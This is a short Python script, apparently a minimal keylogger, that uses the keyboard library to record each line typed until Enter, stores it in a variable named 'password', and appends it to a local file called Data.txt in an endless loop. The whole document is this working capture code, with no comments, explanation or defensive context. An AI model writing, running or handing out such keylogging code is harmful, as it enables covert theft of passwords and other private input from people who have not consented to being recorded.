import keyboard
path = "Data.txt"
x = False
while x == False:
    Data_file = open(path, 'a')
    events = keyboard.record('enter')
    password = list(keyboard.get_typed_strings(events))
    Data_file.write('\n')
    Data_file.write(password[0])
    Data_file.close()